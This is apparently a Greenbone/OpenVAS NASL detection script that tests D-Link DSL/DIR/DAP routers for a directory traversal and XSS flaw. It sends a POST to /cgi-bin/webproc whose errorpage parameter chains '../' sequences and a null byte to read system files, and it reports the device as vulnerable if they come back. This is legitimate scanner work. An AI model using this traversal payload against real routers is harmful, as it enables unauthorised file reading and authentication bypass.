# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE_PREFIX = "cpe:/o:dlink";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.813804");
  script_version("2025-07-02T05:41:52+0000");
  script_tag(name:"last_modification", value:"2025-07-02 05:41:52 +0000 (Wed, 02 Jul 2025)");
  script_tag(name:"creation_date", value:"2018-07-25 10:11:37 +0530 (Wed, 25 Jul 2018)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("D-Link DSL/DIR/DAP Devices Directory Traversal And XSS Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  # nb: The referenced exploit talks about DIR-600 and DAP-1360 devices but DSL- ones are affected as well.
  script_dependencies("gb_dlink_dsl_consolidation.nasl", "gb_dlink_dap_consolidation.nasl",
                      "gb_dlink_dir_consolidation.nasl", "gb_dlink_dwr_consolidation.nasl");
  script_mandatory_keys("d-link/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"D-Link DSL/DIR/DAP router devices are prone to path traversal
  and cross-site scripting (XSS) vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send the crafted HTTP POST request and check whether it is
  possible to read a file on the filesystem or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to an insufficient validation for errorpage
  parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote attacker to read
  arbitrary files on the target system and execute arbitrary script further leading to authentication
  bypass easily.");

  script_tag(name:"affected", value:"D-Link DSL-2877AL with Firmware Version ME_1.08.
  Other devices, models or versions might be also affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/45084");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

if( ! infos = get_app_port_from_cpe_prefix( cpe:CPE_PREFIX, service:"www" ) )
  exit( 0 );

port = infos["port"];
CPE = infos["cpe"];

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

files = traversal_files( "linux" );
url = dir + "/cgi-bin/webproc";

foreach pattern( keys( files ) ) {

  file = files[pattern];

  data = "getpage=html%2Findex.html&errorpage=" + crap( data:"../", length:3*12 ) + file + "%00&var%3Amenu=setup&var%3Apage=wizard&var%3Alogin=true&obj-action=auth&%3Ausername=admin";
  req = http_post_put_req( port:port, url:url, data:data );
  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( buf =~ "^HTTP/1\.[01] 200" && egrep( string:buf, pattern:pattern, icase:TRUE ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
